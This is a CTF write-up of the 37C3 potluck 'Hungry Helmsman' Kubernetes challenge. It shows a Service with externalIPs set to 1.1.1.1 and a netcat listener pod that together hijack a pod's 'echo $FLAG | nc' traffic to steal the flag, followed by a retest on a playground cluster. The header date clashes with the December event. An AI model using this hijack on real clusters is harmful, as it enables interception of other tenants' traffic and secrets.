Title: 37C3 CTF (potluck) Hungry Helmsman Challenge Writeup
Date: 2023-08-06 16:42
Category: Writeups

## Background

For this year the usual congress ctf went a bit different than in the previous year. Instead of two big CTFs that went for the duration of the whole congress, there was one smaller one which lasted for 24 hours: The potluck CTF.

This would actually be my first time participating in the congress CTF and although i have some previous CTF experience i sincerely doubted that i would finish even one of the challenges as i didnt have a lot of experience in the more sophisticated areas (looking at you custom instruction set decompiler builders). So i was actually quite happy when i saw that there is a kubernetes related challenge.

Disclaimer: You may need some basic understanding of how kubernetes networking works (which you can get from my previous blog posts 😉) for this to make sense.

## The Challenge

The preface of the challenge is relatively simple. First, you connect to a telnet server which returns you with a kubeconfig to a temporary cluster.

So after we retrieved this kubeconfig, lets take a look at what we can do with it:

```bash
~/D/congress_ctf> kubectl --kubeconfig kubeconfig get all -A
NAMESPACE   NAME                             READY STATUS  RESTARTS AGE
flag-sender pod/flag-sender-676776d678-9wjgr 1/1   Running 0        43s
...

NAMESPACE   NAME                                    READY UP-TO-DATE  AVAILABLE AGE
flag-sender deployment.apps/flag-sender             1/1   1           1         54s
kube-system deployment.apps/calico-kube-controllers 1/1   1           1         55s

NAMESPACE   NAME                                                DESIRED CURRENT READY AGE
flag-sender replicaset.apps/flag-sender-676776d678              1       1       1     43s
kube-system replicaset.apps/calico-kube-controllers-7ddc4f45bc  1       1       1     43s
```

So right of the bat, we see some interesting stuff. We have a deployment together with a pod with the name `flag-sender`. This seems interesting. Lets inspect the pod:

```bash
mowoe@MacBook-Air-von-Moritz ~/D/congress_ctf> kubectl --kubeconfig kubeconfig -n flag-sender describe pod/flag-sender-676776d678-9wjgr
Name: flag-sender-676776d678-9wjgr
Namespace: flag-sender
Priority: 0
Service Account: default
Node: flux-cluster-b33d981245a244b5bc6d3a303ba01e5c-md-0-h5tst-phwvt7/172.18.0.34
Start Time: Thu, 28 Dec 2023 19:05:14 +0100
Labels: app=flag-sender
pod-template-hash=676776d678
Annotations:
  cni.projectcalico.org/containerID: 521819f162a7cc3e15bc0c1deb6dbc0d378a8cdc536a379c96a627a534e202e9
  cni.projectcalico.org/podIP: 192.168.1.1/32
  cni.projectcalico.org/podIPs: 192.168.1.1/32
Status: Running
IP: 192.168.1.1
IPs:
  IP: 192.168.1.1
Controlled By: ReplicaSet/flag-sender-676776d678
Containers:
  container:
    Container ID: containerd://05b8e3131370a1455576997d3a8c0a1be616585bc0787cd48beefd717f90fda0
    Image: busybox
    Image ID: docker.io/library/busybox@sha256:ba76950ac9eaa407512c9d859cea48114eeff8a6f12ebaa5d32ce79d4a017dd8
    Port: <none>
    Host Port: <none>
    Command: sh
    Args:
      -c
      while true; do echo $FLAG | nc 1.1.1.1 80 || continue; echo 'Flag Send'; sleep 10; done
    State: Running
    Started: Thu, 28 Dec 2023 19:05:28 +0100
    Ready: True
    Restart Count: 0
    Environment:
      FLAG: <set to the key 'flag' in secret 'flag'>
      Optional: false
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-k9x5x (ro)
Conditions:
  Type Status
  Initialized True
  Ready True
  ContainersReady True
  PodScheduled True
Volumes:
  kube-api-access-k9x5x:
    Type: Projected (a volume that contains injected data from multiple sources)
    TokenExpirationSeconds: 3607
    ConfigMapName: kube-root-ca.crt
    ConfigMapOptional: <nil>
DownwardAPI: true
QoS Class: BestEffort
Node-Selectors: <none>
--
Normal Created 2m38s kubelet Created container container
Normal Started 2m38s kubelet Started container container
```

So, what does this pod do?
As we can see from its command, it basically reads a flag it gets from an environment variable (which is mounted via a secret) and sends it via netcat to `1.1.1.1`.

Lets take a look what the container currently outputs:

```bash
~/D/congress_ctf > kubectl --kubeconfig kubeconfig -n flag-sender logs pods/flag-sender-676776d678-9wjgr
HTTP/1.1 400 Bad Request
Server: cloudflare
Date: Thu, 28 Dec 2023 18:05:28 GMT
Content-Type: text/html
Content-Length: 155
Connection: close
CF-RAY: -

<html>
<head><title>400 Bad Request</title></head>
<body>
<center><h1>400 Bad Request</h1></center>
<hr><center>cloudflare</center>
</body>
</html>
Flag Send
```

Not surprising, `1.1.1.1` (which is cloudflare dns) responds with a `400`, because the flag is not valid HTTP. To retrieve the flag we somehow need to attack the communication between the cluster and cloudflare.

Obviously, the cloudflare part is off-limits, so we need to focus on our cluster. Of course, the easiest would be to just modify the deployment to point the command to our own IP. But unfourtunately, our kubeconfig user is pretty limited with RBAC. We can verify this with `kubectl auth can-i --list`:

```bash
~/D/congress_ctf> kubectl auth -n flag-sender can-i --list
Resources Non-Resource URLs Resource Names Verbs
...
pods/log [] [] [get list watch]
pods/status [] [] [get list watch]
pods [] [] [get list watch]
replicationcontrollers/scale [] [] [get list watch]
replicationcontrollers/status [] [] [get list watch]
replicationcontrollers [] [] [get list watch]
resourcequotas/status [] [] [get list watch]
resourcequotas [] [] [get list watch]
serviceaccounts [] [] [get list watch]
services/status [] [] [get list watch]
services [] [] [get list watch]
controllerrevisions.apps [] [] [get list watch]
daemonsets.apps/status [] [] [get list watch]
daemonsets.apps [] [] [get list watch]
deployments.apps/scale [] [] [get list watch]
deployments.apps/status [] [] [get list watch]
deployments.apps [] [] [get list watch]
replicasets.apps/scale [] [] [get list watch]
replicasets.apps/status [] [] [get list watch]
replicasets.apps [] [] [get list watch]
statefulsets.apps/scale [] [] [get list watch]
statefulsets.apps/status [] [] [get list watch]
statefulsets.apps [] [] [get list watch]
...
```

So its pretty obvious that we cant do anything in this namespace. But, luckily, there is another namespace called `flag-receiver`, the name might hint that we need to deploy something here.

Also the challenge description hinted at "crafting the perfect deployment to retrieve the flag".

Lets check our permissions in this namespace:

```bash
~/D/congress_ctf> kubectl auth -n flag-receiver can-i --list
Resources Non-Resource URLs Resource Names Verbs
pods._ [] [] [create delete]
services._ [] [] [create delete]
selfsubjectreviews.authentication.k8s.io [] [] [create]
selfsubjectaccessreviews.authorization.k8s.io [] [] [create]
selfsubjectrulesreviews.authorization.k8s.io [] [] [create]
...
```

So we are able to create pods/deployments and services in this namespace.

At this stage i spent a lot more time than i should have. But I at least knew that part of the solution was to have a pod which later receives the flag. I initially also tried to just get a pod with privileged access running and just go onto the host from there, but the pod creation is pretty locked down as you can see from the pod manifest that i finally came up with.

The cluster will restrict basically everything that it is able to. Because of this, i had to create my own quick and dirty docker image, which had a default user with a uid != 0. You also need to specify resource requests & limits as well es restricting the container from later on becoming root.

Lets take a look at the pod manifest i came up with at the end:

`pod.yaml`

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: root-access-pod
  labels:
    run: test-service
spec:
  securityContext:
    runAsNonRoot: true
    seccompProfile:
      type: "RuntimeDefault"
  containers:
    - name: root-access-container
      image: mowoe/ctf-image-v4
      command:
        - "sh"
        - "-c"
        - "nc -l -p 12345 -k -vvv" # Keep the container running to allow connection
      securityContext:
        allowPrivilegeEscalation: false
        capabilities:
          drop:
            - "ALL"
      resources:
        limits:
          cpu: "100m"
          memory: "25M"
        requests:
          cpu: "50m"
          memory: "25M"
```

And apply it:

```bash
~/D/congress_ctf> kubectl apply -n flag-receiver -f pod.yaml
```

The Dockerfile for the mentioned container is pretty basic:

```Dockerfile
FROM debian

RUN useradd -ms /bin/bash mowoe
RUN apt update && apt install netcat-traditional
USER 1000
```

Sidenote: We have to use a port in the range you are allowed to use when not being root due to the security restrictions. But that doesn't matter because we can later just map our container port (`12345` in our case) to a different port with a service object.

So this pod will later receive our flag and just print it out into the logs. But we still need to redirect the traffic from the flag-sender pod to our own pod.

As we saw previously, the cluster uses calico as CNI, so i tried to install calicoctl to get some more insight, but of course, there weren't enough permissions for that.

My thinking here was that we somehow need to add an additional IP Pool/Range to calico, so that we can later just instruct calico to add the `1.1.1.1` IP to our service. This is because calico (or any other CNI for that matter) will dynamically assign IP addresses from the cluster IP range to the services and we aren't allowed to do that by ourselves. But you would be able to choose a specific calico IP range by specifying some labels in the service definition.

But, as it turns out, the solution is much simpler. Kubernetes Services also have an external-ip field, which primarily gets used if the service is of type `LoadBalancer`. This field normally will get set by the LB controller (e.g. [MetalLB](https://metallb.universe.tf/) on bare-metal clusters). But we are actually able to set this IP address ourselves in the service definition. So lets just create a service which is linked to the pod we created earlier and give this service an external ip of 1.1.1.1:

`service.yaml`:

```yaml
apiVersion: v1
kind: Service
metadata:
  name: port-redirect-service-v2
spec:
  externalIPs:
    - 1.1.1.1
  selector:
    run: test-service
  ports:
    - protocol: TCP
      port: 80
      targetPort: 12345
```

```bash
kubectl apply -n flag-receiver -f service.yaml
```

And lets take a look:

```bash
~/D/congress_ctf> kubectl get svc
NAME                      TYPE      CLUSTER-IP    EXTERNAL-IP PORT(S) AGE
port-redirect-service-v2  ClusterIP 10.139.117.16 1.1.1.1     80/TCP  8s
~/D/congress_ctf>
```

So we have actually created a service with an external IP of `1.1.1.1` completely bypassing any existing networking logic. Now, we can extract the flag from the logs of our created container:

```bash
~/D/congress_ctf> kubectl logs -n flag-receiver pod/root-access-pod
listening on [any] 12345 ...
192.168.132.128: inverse host lookup failed: Host name lookup failure
connect to [192.168.132.132] from (UNKNOWN) [192.168.132.128] 40723
 sent 0, rcvd 39
potluck{kubernetes_can_be_a_bit_weird}
~/D/congress_ctf>
```

And there we have it, we successfully extracted the flag.

Surprisingly, our team actually finished this challenge first and after solving some more challenges we got to place 14 out of 800 teams!

## Aftermath

One interesting question remains: Can we actually just assign random IP addresses to services in our cluster? This would seem kinda insecure...

To test this, i just used a playground cluster of mine and tried to to the exact same thing: Create a service with an external IP already set and check if other workloads in the cluster will get their traffic redirected:

```
~> kubectl  create namespace testing
namespace/testing created
~> kubectl  apply -f svc.yml -n testing
service/port-redirect-service-v2 created
~> kubectl  get svc -n testing
NAME                       TYPE        CLUSTER-IP    EXTERNAL-IP   PORT(S)   AGE
port-redirect-service-v2   ClusterIP   10.43.182.2   1.1.1.1       80/TCP    21s
~> kubectl exec -n fooblargh pod/fooblargh-deployment-f4b8c7c9c-2l94p -it -- /bin/bash
root@fooblargh-deployment-ccc86fb59-tm77s:/app# curl 1.1.1.1
curl: (7) Failed to connect to 1.1.1.1 port 80 after 0 ms: Couldn't connect to server
root@fooblargh-deployment-ccc86fb59-tm77s:/app#
exit
```

Looks like it did something, lets see if it returns if we delete the service again:

```
~> kubectl delete -n testing svc/port-redirect-service-v2
service "port-redirect-service-v2" deleted
~> kubectl exec  exec -n fooblargh pod/fooblargh-deployment-f4b8c7c9c-2l94p -it -- /bin/bash
root@fooblargh-deployment-ccc86fb59-tm77s:/app# curl 1.1.1.1
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>cloudflare</center>
</body>
</html>
root@fooblargh-deployment-ccc86fb59-tm77s:/app#
```

So this actually worked!

Is this now a vulnerability? Well, probably no. Most communication should be secured by SSL anyway, so this "attack vector" is pretty small. Besides that, if you have someone that you don't trust, you should restrict the kubeapi access to not allow service patching as well as restrict which fields a user can supply when creating objects. Still, it is very interesting and something to keep in mind.

In a real world setting, this would also probably freak out any cloud providers LB implementation and it would be quick to remove the address again.

This concludes my (first) write up, thanks for reading 😉
